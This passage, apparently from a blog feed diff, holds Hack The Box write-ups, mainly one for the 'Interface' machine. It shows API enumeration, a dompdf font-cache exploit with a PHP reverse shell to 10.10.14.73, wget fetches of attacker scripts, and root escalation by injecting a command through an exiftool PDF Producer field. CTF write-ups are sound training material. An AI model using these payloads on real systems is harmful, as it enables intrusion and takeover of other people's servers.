highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; gave me root user.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; wget http://&amp;lt;ip&amp;gt;:8000/full-checkup.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./full-checkup.sh 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:</summary></entry><entry><title type="html">Hack The Box - Interface [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/08/htb-interface.html" rel="alternate" type="text/html" title="Hack The Box - Interface [Medium]" /><published>2023-06-08T00:00:00+03:00</published><updated>2023-06-08T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/08/htb-interface</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/08/htb-interface.html">&lt;p&gt;The most important in this machine would be the enumeration, it exploits vulnerabilities like:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/&quot;&gt;CVE-2022-28368&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid&quot;&gt;Executing files with sudo privileges&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;I started with just the website &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;interface.htb&lt;/code&gt; where there isn’t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nginx/1.14.0 (Ubuntu)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 14 Feb 2023 08:44:41 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html; charset=utf-8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Security-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos; &apos;self&apos; data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src &apos;self&apos; http://prd.m.rendering-api.interface.htb; style-src &apos;self&apos; &apos;unsafe-inline&apos; https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Next.js&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i8ubiadkff4wf&quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;6359&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I saw the CSP header which has a bunch of websites in, and frankly I didn’t spot the subdomain at first, but that was the next pivoting point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://prd.m.rendering-api.interface.htb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Going to the subdomain, you are greeted by a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File not Found&lt;/code&gt; text with a 404 status. Here comes the tricky part, the usual reconning using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf,feroxbuster&lt;/code&gt; and such, are ignoring the 404 status over the things it finds, and it’s tricky to set something that is working for this particular case.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I found several endpoints that are returning more than just 404.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;api/experiments/configurations [Status: 404, Size: 50, Words: 3, Lines: 1...
+api/experiments         [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
+api                     [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
+vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, I found some API responses over those endpoints.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$ curl -i http://prd.m.rendering-api.interface.htb/api/                                  
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;404&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Not Found&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nginx/1.14.0 (Ubuntu)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 14 Feb 2023 08:53:49 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Transfer-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;chunked&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;keep-alive&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;404&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status_text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;route not defined&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I began enumerating the API, by filtering the 404 using a GET request.&lt;/p&gt;
+
+&lt;p&gt;The tricky thing is that you must try to use all the methods &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET,POST,PUT,DELETE&lt;/code&gt; on everything. That could have been easier with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feroxbuster&lt;/code&gt; but the thing is that on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feroxbuster&lt;/code&gt; tool there isn’t an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mc all&lt;/code&gt; option which matches all the response codes and I had to do it manually with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This is what I’ve used to find another pivot point.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -mc all -fs 50 -X POST
+...
+html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I found other stuff like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;composer,dumpdf&lt;/code&gt; before that and I started to search some exploits for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpdf&lt;/code&gt; since I thought that would be the next pivot point and found this PoC of an exploit: https://github.com/positive-security/dompdf-rce.&lt;/p&gt;
+
+&lt;p&gt;The next thing to figure out was how to pass the file to that endpoint. While I tried to just send the file without any parameters, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;missing parameters&lt;/code&gt; so I had to explore the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dompdf&lt;/code&gt; implementations. The parameters that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dompdf&lt;/code&gt; uses are just two.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dompdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;loadHtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$dompdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setPaper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;A4&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;landscape&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dompdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I know that this is an API, so it must accept some JSON, so I crafted some random payload which I admit I got really lucky.&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;paper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A4&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Because the response was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;200 OK&lt;/code&gt; and a binary with the attached PDF.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting-the-dumpdf-rce&quot;&gt;Exploiting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpdf RCE&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpdf&lt;/code&gt; is apparently caching the fonts that it processes during the conversion of HTML to PDF. It stores them under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vendor/dompdf/dompdf/lib/fonts/&lt;/code&gt; folder. Earlier in my discovery I enumerated another possible pivoting point that however gave 403, which was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vendor/dompdf/dompdf&lt;/code&gt; so following the PoC I’ve crafted the following payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/html2pdf&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prd.m.rendering-api.interface.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;47&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;link rel=stylesheet href=&apos;http://10.10.14.73:8000/syl.css&apos;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;paper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A4&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# syl.css
+@font-face {
+    font-family:&apos;syl&apos;;
+    src:url(&apos;http://10.10.14.73:8000/syl.php&apos;);
+    font-weight:&apos;normal&apos;;
+    font-style:&apos;normal&apos;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# syl.php, this is a legit font just with 1 line PHP on the bottom
+&amp;lt;LEGIT FONT BINARY DATA&amp;gt;
+&amp;lt;?php exec(&quot;/bin/bash -c &apos;bash -i &amp;gt; /dev/tcp/10.10.14.73/4444 0&amp;gt;&amp;amp;1&apos;&quot;); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After that I execute the request, the server would try to get the CSS and the font from my server, and it would cache the font into the specified folder and after executing the request. I saw that it does exactly that:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# My Server logs
+10.129.20.249 - - [14/Feb/2023 11:20:07] &quot;GET /syl.css HTTP/1.0&quot; 200 -
+10.129.20.249 - - [14/Feb/2023 11:20:07] &quot;GET /syl.php HTTP/1.0&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That means that we have our ‘font’ already cached on the server under the folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vendor/dompdf/dompdf/lib/fonts/&lt;/code&gt; however what would be the name, because trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl.php&lt;/code&gt; wasn’t yielding results.&lt;/p&gt;
+
+&lt;p&gt;To figure that out I thought it might be several things, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5(file), md5(url of the font), some_hashing_algo(file/url of the font)&lt;/code&gt; so I had to research how it saves the fonts. Fortunately, the PoC gives us a clue of how is this working. The font file there is named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploitfont_normal_3f83639933428d70e74a061f39009622.php&lt;/code&gt; and I brute forced my way out of this by trying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl_normal_&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5(file), md5(url of the font)&lt;/code&gt; and the URL of the font was the right one, so I got a reverse shell with that.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/syl_normal_ee17d95350fea4e27875b56170439107.php
+...
+$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.73] from (UNKNOWN) [10.129.20.249] 60822
+pwd
+/var/www/api/vendor/dompdf/dompdf/lib/fonts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With that and using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; I could read the first flag which is located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/dev/user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;gaining-root&quot;&gt;Gaining Root&lt;/h2&gt;
+
+&lt;p&gt;This was a tricky one, and I got some help with it since I couldn’t find how. I only found a script that was cleaning some cache files with the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Producer: dompdf&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; folder. The script is located here: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/sbin/cleancache.sh&lt;/code&gt;. I was pretty sure that this is the root pivot point, but I didn’t know how to exploit it.&lt;/p&gt;
+
+&lt;p&gt;I joined some discussions and one of the users mentioned the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too&lt;/code&gt; - https://www.vidarholen.net/contents/blog/?p=716&lt;/p&gt;
+
+&lt;p&gt;I didn’t know that you could do that, but after reading the article it was clear what I should do.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /tmp
+$ mkdir syl
+$ cd syl &amp;amp;&amp;amp; wget http://10.10.14.73:8000/admin.sh
+$ chmod +x ./admin.sh
+$ wget http://10.10.14.73:8000/test.pdf
+$ exiftool -Producer=&apos;a[$(/tmp/syl/admin.sh&amp;gt;&amp;amp;2)]+42&apos; test.pdf
+&amp;lt; -Producer=&apos;a[$(/tmp/syl/admin.sh&amp;gt;&amp;amp;2)]+42&apos; test.pdf
+    1 image files updated
+$ /usr/local/sbin/cleancache.sh
+/usr/local/sbin/cleancache.sh
+chmod: changing permissions of &apos;/bin/bash&apos;: Operation not permitted
+chmod: changing permissions of &apos;/bin/bash&apos;: Operation not permitted
+$ /bin/bash -p
+bash-4.4# cat /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">The most important in this machine would be the enumeration, it exploits vulnerabilities like: CVE-2022-28368 Executing files with sudo privileges</summary></entry></feed>
